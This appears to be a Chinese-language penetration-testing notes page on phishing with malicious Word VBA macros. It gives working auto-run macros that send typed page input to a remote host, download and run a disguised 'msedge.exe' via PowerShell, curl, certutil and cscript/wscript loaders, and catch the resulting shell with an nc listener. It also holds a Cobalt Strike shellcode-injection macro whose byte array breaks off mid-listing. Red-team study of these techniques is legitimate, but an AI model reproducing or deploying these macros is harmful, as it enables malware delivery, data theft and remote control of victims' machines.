href="#vba宏"><span>VBA宏</span></a></h1><blockquote><p><a href="https://atsud0.me/2022/01/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-Docx%E8%BF%9C%E7%A8%8B%E6%A8%A1%E7%89%88%E5%8A%A0%E8%BD%BD%E5%AE%8F%E4%BB%A3%E7%A0%81/" target="_blank" rel="noopener noreferrer">【钓鱼从入门到放弃】-Docx远程模版加载宏代码 (atsud0.me)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><ul><li><a href="https://blog.csdn.net/qq_34801745/article/details/111307768" target="_blank" rel="noopener noreferrer">渗透测试-地基钓鱼篇-Word文档注入执行恶意宏（二十四）_渗透测试中,office宏执行方法利用-CSDN博客<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul><hr><ul><li><a href="#vba%E5%AE%8F">VBA宏</a><ul><li><a href="#%E6%A6%82%E8%BF%B0">概述</a><ul><li><a href="#vba%E5%AE%8F%E7%9A%84%E7%BB%93%E6%9E%84">VBA宏的结构</a></li></ul></li><li><a href="#%E6%89%A7%E8%A1%8C-javascript">执行 JavaScript</a></li><li><a href="#%E8%B0%83%E7%94%A8-powershell-%E4%BD%BF%E7%94%A8-curl-%E4%B8%8B%E8%BD%BD%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F">调用 PowerShell 使用 curl 下载与执行恶意程序</a></li><li><a href="#%E8%B0%83%E7%94%A8-cmd-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">调用 CMD 执行命令</a><ul><li><a href="#%E8%B0%83%E7%94%A8-cmd-%E4%BD%BF%E7%94%A8-curl-%E4%B8%8B%E8%BD%BD%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F">调用 CMD 使用 curl 下载与执行恶意程序</a></li><li><a href="#%E8%B0%83%E7%94%A8-cmd-%E4%BD%BF%E7%94%A8-certutil-%E4%B8%8B%E8%BD%BD%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F">调用 CMD 使用 Certutil 下载与执行恶意程序</a></li></ul></li><li><a href="#%E8%B0%83cscript%E8%B0%83jscriptvbscript">调CScript调JSCript/VBScript</a></li><li><a href="#%E8%B0%83wscript%E8%B0%83jscriptvbscript">调WScript调JSCript/VBScript</a></li><li><a href="#cobaltstrike%E5%AE%8F%E9%92%93%E9%B1%BCdll%E6%B3%A8%E5%85%A5">CobaltStrike宏钓鱼(DLL注入)</a><ul><li><a href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90">代码解析</a><ul><li><a href="#%E7%BB%93%E6%9E%84%E4%BD%93%E5%AE%9A%E4%B9%89">结构体定义</a></li><li><a href="#%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E">函数声明</a></li></ul></li></ul></li><li><a href="#vba%E5%AE%8F%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8Bxslxmldom">VBA宏加载远程XSL(XMLDOM)</a><ul><li><a href="#%E6%A6%82%E5%BF%B5">概念</a></li><li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%A1%88">利用方案</a><ul><li><a href="#%E7%94%9F%E6%88%90-shellcodepayloadbin">生成 Shellcode(Payload.bin)</a></li><li><a href="#%E5%A4%84%E7%90%86-payloadbin">处理 payload.bin</a></li><li><a href="#%E7%94%9F%E6%88%90-xsl-%E5%92%8C-macro">生成 xsl 和 macro</a></li></ul></li></ul></li><li><a href="#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5">相关链接</a></li><li><a href="#%E5%AE%8F%E5%85%8D%E6%9D%80">宏免杀</a><ul><li><a href="#%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E%E8%BF%9B%E7%A8%8B%E6%A0%91%E7%9A%84%E6%A3%80%E6%B5%8B">绕过基于进程树的检测</a><ul><li><a href="#%E8%BF%9E%E6%8E%A5%E5%88%B0-wmi-%E6%96%B0%E5%BB%BA%E8%BF%9B%E7%A8%8B">连接到 WMI 新建进程</a></li><li><a href="#%E8%8E%B7%E5%8F%96-wsh-%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8-cmd-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">获取 WSH 对象调用 cmd 执行命令</a></li></ul></li></ul></li></ul></li></ul><hr><h2 id="概述" tabindex="-1"><a class="header-anchor" href="#概述"><span>概述</span></a></h2><blockquote><p><a href="https://www.w3cschool.cn/excelvba/excelvba-what.html" target="_blank" rel="noopener noreferrer">详解VBA编程是什么_w3cschool<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><a href="https://jsrun.net/t/GIkKp" target="_blank" rel="noopener noreferrer">Excel VBA 教程 Excel VBA 简介 - 闪电教程JSRUN<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p>直到 90 年代早期,使应用程序自动化还是充满挑战性的领域.对每个需要自动化的应用程序,人们不得不学习一种不同的自动化语言</p><p>例如:可以用EXCEL的宏语言来使EXCEL自动化,使用WORD BASIC使WORD自动化,等等</p><p>微软决定让它开发出来的应用程序共享一种通用的自动化语言——–Visual Basic For Application(VBA)</p><p>可以认为 VBA 是非常流行的应用程序开发语言VASUAL BASIC 的子集.实际上VBA是”寄生于”VB应用程序的版本.VBA和VB的区别包括如下几个方面:</p><ul><li>VB是设计用于创建标准的应用程序,而VBA是使已有的应用程序(EXCEL等)自动化</li><li>VB具有自己的开发环境,而VBA必须寄生于已有的应用程序</li><li>要运行 VB 开发的应用程序,用户不必安装 VB,因为 VB 开发出的应用程序是可执行文件(*.EXE),而VBA开发的程序必须依赖于它的”父”应用程序,例如EXCEL.</li></ul><hr><h3 id="vba宏的结构" tabindex="-1"><a class="header-anchor" href="#vba宏的结构"><span>VBA宏的结构</span></a></h3><p>VBA宏的结构通常包括声明模块、定义子程序（Sub）和函数（Function）、以及在这些子程序和函数中编写实际的代码。</p><p>以下是一个简单的VBA宏结构示例：</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token comment">&#39; 模块声明</span>
<span class="token keyword">Option</span> Explicit

<span class="token comment">&#39; 全局变量声明（如果需要）</span>
<span class="token keyword">Dim</span> exampleVariable <span class="token keyword">As</span> <span class="token keyword">Integer</span>

<span class="token comment">&#39; 子程序</span>
<span class="token keyword">Sub</span> ExampleSub<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment">&#39; 局部变量声明</span>
    <span class="token keyword">Dim</span> localVariable <span class="token keyword">As</span> <span class="token keyword">String</span>
    
    <span class="token comment">&#39; 代码逻辑</span>
    localVariable <span class="token operator">=</span> <span class="token string">&quot;Hello, World!&quot;</span>
    <span class="token comment">&#39; 显示消息框</span>
    MsgBox localVariable
<span class="token keyword">End</span> <span class="token keyword">Sub</span>

<span class="token comment">&#39; 函数</span>
<span class="token keyword">Function</span> ExampleFunction<span class="token punctuation">(</span><span class="token keyword">ByVal</span> x <span class="token keyword">As</span> <span class="token keyword">Integer</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> y <span class="token keyword">As</span> <span class="token keyword">Integer</span><span class="token punctuation">)</span> <span class="token keyword">As</span> <span class="token keyword">Integer</span>
    <span class="token comment">&#39; 代码逻辑</span>
    ExampleFunction <span class="token operator">=</span> x <span class="token operator">+</span> y
<span class="token keyword">End</span> <span class="token keyword">Function</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407011625102.png" alt="image-20240701162530715"></p><hr><h2 id="执行-javascript" tabindex="-1"><a class="header-anchor" href="#执行-javascript"><span>执行 JavaScript</span></a></h2><ol><li><p>新建启用宏的 word 文档 <code>VBA_JS.docm</code></p></li><li><p>在 Word 中编辑宏脚本</p></li><li><p>在“工程 – Project”窗口中，双击“Microsoft Word 对象”，再双击“ThisDocument”。</p></li><li><p>此时在右侧代码窗口顶部，会看到两个列表框，单击左侧下拉列表，将其从“（通用）”更改为“Document”，单击右侧下拉列表，从列表中选择“Close”或“Open”以插入 Document_Close()或 Document_Open()过程，或者可直接在代码窗口输入过程名。</p></li><li><p>在代码框中输入代码，例如获取自动填充的密码并回传数据</p></li></ol><div class="language-vbscript line-numbers-mode" data-ext="vbscript" data-title="vbscript"><pre class="language-vbscript"><code>Private Sub Document_Open()

Dim oBrowser As Object
Set oBrowser = CreateObject(&quot;InternetExplorer.Application&quot;)

&#39;打开网页
oBrowser.Visible = True
oBrowser.Navigate &quot;https://xx.xx.xx&quot;

&#39;等待页面加载完成
Do While oBrowser.ReadyState &lt;&gt; 4
    DoEvents
Loop

&#39;执行 JavaScript 获取输入框的信息并通过 get 请求  http://127.0.0.1:8000?data=xxx 传输
oBrowser.Document.parentWindow.execScript &quot;var inputElements = document.querySelectorAll(&#39;.el-input__inner&#39;);&quot;, &quot;JavaScript&quot;
oBrowser.Document.parentWindow.execScript &quot;var data = &#39;&#39;; for (var i = 0; i &lt; inputElements.length; i++) { data += inputElements[i].value + &#39; &#39;; }&quot;, &quot;JavaScript&quot;
oBrowser.Document.parentWindow.execScript &quot;var xhr = new XMLHttpRequest(); xhr.open(&#39;GET&#39;, &#39;http://127.0.0.1:8000&quot; &amp; &quot;?data=&#39; + data, true); xhr.send();&quot;, &quot;JavaScript&quot;
&#39;关闭浏览器
oBrowser.Quit
Set oBrowser = Nothing

End Sub
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-vbscript line-numbers-mode" data-ext="vbscript" data-title="vbscript"><pre class="language-vbscript"><code>Private Sub Document_Open()

Dim oBrowser As Object
Set oBrowser = CreateObject(&quot;InternetExplorer.Application&quot;)
oBrowser.Visible = True
oBrowser.Navigate &quot;http://100.1.1.131:8000&quot;
Do While oBrowser.ReadyState &lt;&gt; 4
    DoEvents
Loop
&#39;执行 JavaScript 获取输入框的信息并通过 get 请求  http://100.1.1.131:8000?data=xxx 传输
oBrowser.Document.parentWindow.execScript &quot;var inputElements = document.querySelectorAll(&#39;.el-input__inner&#39;);&quot;, &quot;JavaScript&quot;
oBrowser.Document.parentWindow.execScript &quot;var data = &#39;&#39;; for (var i = 0; i &lt; inputElements.length; i++) { data += inputElements[i].value + &#39; &#39;; }&quot;, &quot;JavaScript&quot;
oBrowser.Document.parentWindow.execScript &quot;var xhr = new XMLHttpRequest(); xhr.open(&#39;GET&#39;, &#39;http://100.1.1.131:8000&quot; &amp; &quot;?data=&#39; + data, true); xhr.send();&quot;, &quot;JavaScript&quot;
&#39;关闭浏览器
oBrowser.Quit
Set oBrowser = Nothing

End Sub

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261650962.png" alt="image-20240626165022773"></p><p>当用户打开这个 word 文档则会调起浏览器执行 JS 收集信息并向远程服务器发送信息</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261652002.png" alt="image-20240626165255860"></p><blockquote><p>PS: 示例收集数据信息为空</p></blockquote><hr><h2 id="调用-powershell-使用-curl-下载与执行恶意程序" tabindex="-1"><a class="header-anchor" href="#调用-powershell-使用-curl-下载与执行恶意程序"><span>调用 PowerShell 使用 curl 下载与执行恶意程序</span></a></h2><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Sub</span> Document_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">Dim</span> command <span class="token keyword">As</span> <span class="token keyword">String</span>
    command <span class="token operator">=</span> <span class="token string">&quot;powershell.exe -Command &quot;&quot;calc.exe&quot;&quot;&quot;</span>
    <span class="token keyword">Call</span> Shell<span class="token punctuation">(</span>command<span class="token punctuation">,</span> vbNormalFocus<span class="token punctuation">)</span>
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>需要注意的是 <code>powershell.exe -Command</code> 后面的命令要用<strong>两层</strong>双引号包裹起来, 一层是Powershell需要的,一层是VBA Call Shell 需要的</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407121452738.png" alt="image-20240712145248578"></p><hr><p>调用 Powershell 使用 Invoke-WebRequest 下载恶意程序然后使用 Start-Process 执行</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Sub</span> Document_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">Dim</span> command <span class="token keyword">As</span> <span class="token keyword">String</span>
    command <span class="token operator">=</span> <span class="token string">&quot;powershell.exe -Command &quot;&quot;Invoke-WebRequest -Uri http://100.1.1.131:8000/download/msedge.exe -OutFile msedge.exe; Start-Process msedge.exe&quot;&quot;&quot;</span>
    <span class="token keyword">Call</span> Shell<span class="token punctuation">(</span>command<span class="token punctuation">,</span> vbNormalFocus<span class="token punctuation">)</span>
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><h2 id="调用-cmd-执行命令" tabindex="-1"><a class="header-anchor" href="#调用-cmd-执行命令"><span>调用 CMD 执行命令</span></a></h2><h3 id="调用-cmd-使用-curl-下载与执行恶意程序" tabindex="-1"><a class="header-anchor" href="#调用-cmd-使用-curl-下载与执行恶意程序"><span>调用 CMD 使用 curl 下载与执行恶意程序</span></a></h3><div class="language-vbscript line-numbers-mode" data-ext="vbscript" data-title="vbscript"><pre class="language-vbscript"><code>Private Sub Document_Open()

Call Shell(Environ$(&quot;COMSPEC&quot;) &amp; &quot; /c powershell.exe curl http://100.1.1.131:8000/download/msedge.exe -o msedge.exe &amp;&amp; msedge.exe&quot;, vbNormalFocus)

End Sub
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>Environ$(&quot;COMSPEC&quot;)</code>：获取系统环境变量<code>COMSPEC</code>的值。<code>COMSPEC</code>通常包含命令处理器的路径，例如<code>cmd.exe</code>, 可以用 PowerShell 看下</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token function">Write-Host</span> <span class="token variable">$env</span>:COMSPEC
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407121427541.png" alt="image-20240712142736124"></p><p>打开该文档机器实现 shell 上线</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">65521</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token string">&quot;<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token string">&#39;+%Y-%m-%d %H:%M:%S&#39;</span><span class="token variable">)</span></span> <span class="token variable">$line</span>&quot;</span><span class="token punctuation">;</span><span class="token keyword">done</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261655301.png" alt="image-20240626165505178"></p><hr><h3 id="调用-cmd-使用-certutil-下载与执行恶意程序" tabindex="-1"><a class="header-anchor" href="#调用-cmd-使用-certutil-下载与执行恶意程序"><span>调用 CMD 使用 Certutil 下载与执行恶意程序</span></a></h3><div class="language-vbscript line-numbers-mode" data-ext="vbscript" data-title="vbscript"><pre class="language-vbscript"><code>Private Sub Document_Open()
Call Shell(Environ$(&quot;COMSPEC&quot;) &amp; &quot; /c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe &amp;&amp; msedge.exe&quot;, vbNormalFocus)
End Sub
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261655545.png" alt="image-20240626165543364"></p><p>受害者打开此文档后会下载恶意程序并上线 shell</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261656785.png" alt="image-20240626165556298"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261656847.png" alt="image-20240626165641767"></p><hr><h2 id="调cscript调jscript-vbscript" tabindex="-1"><a class="header-anchor" href="#调cscript调jscript-vbscript"><span>调CScript调JSCript/VBScript</span></a></h2><div class="language-vbscript line-numbers-mode" data-ext="vbscript" data-title="vbscript"><pre class="language-vbscript"><code>Private Sub Document_Open()

    Open &quot;art.jse&quot; For Output As #1
    Print #1, &quot;var url = &#39;http://100.1.1.131:8000/download/msedge.exe&#39;;var network = new ActiveXObject(&#39;WScript.Network&#39;);var username = network.UserName;var downloadPath = &#39;C:\\Users\\&#39; + username + &#39;\\AppData\\Local\\Temp\\msedge.exe&#39;;var xmlhttp = new ActiveXObject(&#39;MSXML2.XMLHTTP&#39;);xmlhttp.open(&#39;GET&#39;, url, false);xmlhttp.send();var stream = new ActiveXObject(&#39;ADODB.Stream&#39;);stream.Open();stream.Type = 1;stream.Write(xmlhttp.responseBody);stream.Position = 0;stream.SaveToFile(downloadPath, 2); stream.Close();var shell = new ActiveXObject(&#39;WScript.Shell&#39;);shell.Run(downloadPath);&quot;
    Close #1
    Shell &quot;cscript.exe art.jse&quot;

End Sub
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>受害者打开该文件会下载并上线 shell</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261702961.png" alt="image-20240626170250843"></p><hr><h2 id="调wscript调jscript-vbscript" tabindex="-1"><a class="header-anchor" href="#调wscript调jscript-vbscript"><span>调WScript调JSCript/VBScript</span></a></h2><div class="language-vbscript line-numbers-mode" data-ext="vbscript" data-title="vbscript"><pre class="language-vbscript"><code>Private Sub Document_Open()

    Open &quot;de.vbs&quot; For Output As #1
    Print #1, &quot;Set xmlHttp = CreateObject(&quot;&quot;MSXML2.XMLHTTP&quot;&quot;) : Set adodbStream = CreateObject(&quot;&quot;ADODB.Stream&quot;&quot;) : url = &quot;&quot;http://100.1.1.131:8000/download/msedge.exe&quot;&quot; : username = CreateObject(&quot;&quot;WScript.Network&quot;&quot;).UserName : savePath = &quot;&quot;C:\\Users\\&quot;&quot; + username + &quot;&quot;\\AppData\\Local\\Temp\\msedge.exe&quot;&quot; : xmlHttp.Open &quot;&quot;GET&quot;&quot;, url, False : xmlHttp.Send : If xmlHttp.Status = 200 Then adodbStream.Type = 1 : adodbStream.Open : adodbStream.Write xmlHttp.ResponseBody : adodbStream.SaveToFile savePath, 2 : adodbStream.Close : Set shell = CreateObject(&quot;&quot;WScript.Shell&quot;&quot;) : shell.Run savePath, 1, False Else WScript.Echo &quot;&quot;下载失败，状态代码：&quot;&quot; &amp; xmlHttp.Status End If : Set adodbStream = Nothing : Set xmlHttp = Nothing : Set shell = Nothing&quot;
    Close #1
    Shell &quot;wscript.exe de.vbs&quot;

End Sub
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>受害者打开该文件会下载并上线 shell</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261703093.png" alt="image-20240626170340011"></p><hr><h2 id="cobaltstrike宏钓鱼-dll注入" tabindex="-1"><a class="header-anchor" href="#cobaltstrike宏钓鱼-dll注入"><span>CobaltStrike宏钓鱼(DLL注入)</span></a></h2><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407011130434.png" alt="image-20240701113038801"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407011132355.png" alt="image-20240701113217215"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407011132325.png" alt="image-20240701113244190"></p><div class="language-vbscript line-numbers-mode" data-ext="vbscript" data-title="vbscript"><pre class="language-vbscript"><code>Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

    #If VBA7 Then
        Dim rwxpage As LongPtr, res As LongPtr
    #Else
        Dim rwxpage As Long, res As Long
    #End If
    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _
-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _
-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _
104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _
-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _
-1,-1,47,104,55,113,76,0,-64,-89,-9,-97,-35,-61,-2,67,-43,-76,-7,-112,84,-36,22,-7,16,53,19,-31,10,-80,108,-37,-14,26,-10,113,40,56,-114,-98, _
92,-39,-88,-5,79,-69,-88,-9,27,40,-87,7,111,29,13,2,76,-49,-60,-4,-47,-74,-64,20,-27,-74,-112,45,-88,-61,-3,103,-19,11,-121,23,69,65,106,-75, _
87,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _
83,73,69,32,56,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,84,114,105,100,101,110,116,47,52,46,48,59,32,81,81, _
